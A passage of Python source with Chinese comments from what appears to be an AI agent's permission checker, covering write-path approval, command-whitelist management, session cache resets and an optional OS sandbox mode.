                    add_extra_allowed_root(parent)
                except Exception:
                    pass
                # 持久化:写 settings.json 的 security.extra_allowed_roots
                # (和 /add-dir 走同一条通道)
                persisted = False
                try:
                    from agent.settings import persist_extra_allowed_root
                    persisted = persist_extra_allowed_root(str(parent))
                except Exception as e:
                    logger.warning("写入根目录持久化失败（会话内仍有效）: %s", e)
                reason = (
                    "已批准（总是允许，已持久化）" if persisted
                    else "已批准（总是允许，持久化失败仅会话内有效）"
                )
                return PermissionResult(True, reason, "approval")

            approved = bool(decision)
            if approved:
                # 批了:父目录进会话缓存,同目录后续写入不再问
                with self._wl_lock:  # L13 并发一致性
                    self._approved_write_roots.add(resolved.parent)
                return PermissionResult(True, "已批准（写入根目录）", "approval")
            return self._deny(str(path), "用户拒绝", "approval")

        # 3.4 没配 callback → 拒(拒绝消息里带上允许的根目录,方便排查)
        return self._deny(
            str(path),
            f"写入路径不在白名单: {resolved}（允许: {[str(r) for r in roots]}）",
            "protected",
        )

    def add_to_whitelist(self, command: str):
        """手动往持久化白名单加一条命令(如 /approved 命令用)。

        参数:
            command: 要加的命令。
        """
        with self._wl_lock:
            self._persistent_whitelist.add(command.strip())
        self._save_whitelist()

    def remove_from_whitelist(self, command: str) -> bool:
        """从持久化白名单移除一条。

        参数:
            command: 要移除的命令。

        返回:True 表示找到并移除了;False 表示本来就不在白名单里。
        """
        with self._wl_lock:
            before = len(self._persistent_whitelist)
            self._persistent_whitelist.discard(command.strip())
            removed = len(self._persistent_whitelist) < before
        if removed:
            self._save_whitelist()
            return True
        return False

    def list_whitelist(self) -> list:
        """列出持久化白名单(排好序返回)。"""
        return sorted(self._persistent_whitelist)

    def reset_cache(self):
        """清空会话内缓存(持久化白名单不动)。

        为什么需要:审批缓存是会话级的,新会话/测试要重置,避免长期信任漂移。
        """
        self._approved.clear()
        # 写入根目录的审批缓存同样是会话级的,一并清
        self._approved_write_roots.clear()

    def set_sandbox_mode(self, mode: str) -> None:
        """切换 OS 沙箱模式(/sandbox 命令调用)。

        参数：
            mode: "off" 关闭(默认)或 "on" 开启。
                  on 的时候 terminal_tool 会把命令包进沙箱 wrapper 里跑
                  (Linux 用 bwrap、macOS 用 seatbelt、Windows 用 Job Object)。
                  沙箱不可用时降级(fail-open:警告一声,走原路径执行)。

        异常：
            ValueError: mode 不是 "off"/"on" 之一。
        """
        if mode not in ("off", "on"):
            raise ValueError(f"非法 sandbox_mode: {mode}（仅支持 off / on）")
        self.sandbox_mode = mode


# 全局默认 checker(没配审批 callback,只走硬性闸门)——工具层拿不到
# 定制 checker 时的兜底
_default_checker = PermissionChecker()


def get_default_checker() -> PermissionChecker:
    """取全局默认 checker(见上方模块级变量的说明)。"""
    return _default_checker


def set_default_checker(checker: PermissionChecker) -> None:
    """换成指定的全局默认 checker(CLI 启动时调用,注入带审批 callback 的实例)。

    参数:
        checker: 新的 checker 实例。
    """
    global _default_checker
    _default_checker = checker
